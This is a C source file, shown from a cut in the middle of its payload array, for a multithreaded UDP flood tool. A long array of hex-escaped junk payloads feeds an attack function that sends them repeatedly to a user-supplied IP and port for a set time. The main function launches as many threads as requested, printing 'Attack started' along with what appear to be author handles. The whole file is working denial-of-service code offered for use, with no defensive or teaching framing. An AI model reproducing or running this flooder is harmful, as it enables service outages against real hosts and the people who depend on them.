xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xab\xcd\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\x00\xff\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xde\xad\xbe\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x02\x03\x04\x05\x06\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\x00\xff\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\x00\xff\xab\xcd\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\x00\xff\x00\xff\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab",
   };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: Soulcracks %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished join @PYSCHOxKINGYT\n");
    return 0;
}
